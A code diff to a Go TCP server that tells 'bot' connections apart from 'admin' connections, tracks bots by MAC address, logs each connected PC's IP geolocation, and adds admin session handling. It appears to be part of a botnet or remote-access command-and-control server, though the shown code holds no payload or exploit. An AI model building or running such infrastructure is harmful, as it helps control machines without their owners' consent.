@@ -80,32 +80,45 @@ func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
 		return
 	}
 
-	this.handleBot(conn, buffer[:n])
+	// admin OR bot
+	packetType := buffer[3]
+
+	switch packetType {
+	case constants.BOT_TYPE_HELLO:
+		this.handleBot(conn, buffer[:n])
+
+	case constants.ADMIN_TYPE_HELLO:
+		this.handleAdmin(conn, buffer[:n])
+
+	default:
+		this.logger.Error(fmt.Sprintf("Unknown packet type: %d", packetType))
+	}
 }
 
 func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 	emitter := lib.NewEventEmitter()
-	botClient := NewBotClient(conn, this.cache, emitter)
-	botClient.isBotConnected = true
+	clientModule := NewClientModule(conn, this.cache, emitter)
+	clientModule.isBotConnected = true
 
 	defer func() {
-		this.cache.RemoveCache(utils.MacPrettyConvert(botClient.mac))
+		this.cache.RemoveCache(utils.MacPrettyConvert(clientModule.mac))
+		this.session.RemoveBotSession(utils.MacPrettyConvert(clientModule.mac))
 		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
 	}()
 
 	emitter.On("hello-pack-received", func(received interface{}) {
-		this.cache.NewInitial(utils.MacPrettyConvert(botClient.mac))
+		this.cache.NewInitial(utils.MacPrettyConvert(clientModule.mac))
 
 		// ipgeo unmarshal
 		var ipgeoStruct types.IPGeo
-		if err := json.Unmarshal([]byte(*botClient.ipgeo), &ipgeoStruct); err != nil {
+		if err := json.Unmarshal([]byte(*clientModule.ipgeo), &ipgeoStruct); err != nil {
 			return
 		}
 
-		this.cache.SetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
-		this.session.NewBotSession(utils.MacPrettyConvert(botClient.mac), botClient)
+		this.cache.SetCache(utils.MacPrettyConvert(clientModule.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
+		this.session.NewBotSession(utils.MacPrettyConvert(clientModule.mac), clientModule)
 
-		cache := this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo)
+		cache := this.cache.GetCache(utils.MacPrettyConvert(clientModule.mac), "ipgeo").(types.IPGeo)
 		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
 	})
 
@@ -114,21 +127,21 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 	})
 
 	// HELLO PACKET
-	botClient.parseData(data)
-	mac := utils.MacPrettyConvert(botClient.mac)
+	clientModule.ParseData(data)
+	mac := utils.MacPrettyConvert(clientModule.mac)
 
 	buffer := make([]byte, constants.MAX_PACKET_SIZE)
 	for {
 		data, err := conn.Read(buffer)
 		if err != nil {
 			if errors.Is(err, io.EOF) {
-				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
 			}
 
 			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
-				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+				this.logger.Info(fmt.Sprintf("Bot disconnect: %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
 			} else if os.IsTimeout(err) {
-				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP)) // defer
+				this.logger.Info(fmt.Sprintf("Bot disconnect (timeout): %s", this.cache.GetCache(mac, "ipgeo").(types.IPGeo).IP)) // defer
 			} else {
 				this.logger.Error(fmt.Sprintf("Error reading bot from connection: %s", err.Error())) // defer
 			}
@@ -136,9 +149,54 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 			break
 		}
 
-		this.logger.Info(fmt.Sprintf("DATA[%d]: %s", data, hex.EncodeToString(buffer[:data])))
-		botClient.parseData(buffer[:data])
+		this.logger.Info(fmt.Sprintf("DATA[%d] %s", data, hex.EncodeToString(buffer[:data])))
+		clientModule.ParseData(buffer[:data])
 	}
 }
 
-func (this *TCPServer) handleAdmin(conn net.Conn, data []byte) {}
+func (this *TCPServer) handleAdmin(conn net.Conn, data []byte) {
+	emitter := lib.NewEventEmitter()
+	clientModule := NewClientModule(conn, this.cache, emitter)
+	clientModule.isBotConnected = true
+
+	defer func() {
+		this.session.RemoveAdminSession(utils.MacPrettyConvert(clientModule.mac))
+		this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr()))
+	}()
+
+	emitter.On("hello-pack-received", func(received interface{}) {
+		this.cache.NewInitial(utils.MacPrettyConvert(clientModule.mac))
+		this.session.NewAdminSession(utils.MacPrettyConvert(clientModule.mac), clientModule)
+		this.logger.Info(fmt.Sprintf("CONNECTED ADMIN[%s]", conn.RemoteAddr().String()))
+	})
+
+	emitter.On("error", func(error interface{}) {
+		this.logger.Error(error.(string))
+	})
+
+	// HELLO PACKET
+	clientModule.ParseData(data)
+
+	buffer := make([]byte, constants.MAX_PACKET_SIZE)
+	for {
+		data, err := conn.Read(buffer)
+		if err != nil {
+			if errors.Is(err, io.EOF) {
+				this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr().String())) // defer
+			}
+
+			if sockErr, ok := err.(*net.OpError); ok && sockErr.Op == "read" && sockErr.Err.Error() == "use of closed network connection" {
+				this.logger.Info(fmt.Sprintf("Admin disconnect: %s", conn.RemoteAddr().String())) // defer
+			} else if os.IsTimeout(err) {
+				this.logger.Info(fmt.Sprintf("Admin disconnect (timeout): %s", conn.RemoteAddr().String())) // defer
+			} else {
+				this.logger.Error(fmt.Sprintf("Error reading admin from connection: %s", err.Error())) // defer
+			}
+
+			break
+		}
+
+		this.logger.Info(fmt.Sprintf("DATA[%d] %s", data, hex.EncodeToString(buffer[:data])))
+		clientModule.ParseData(buffer[:data])
+	}
+}
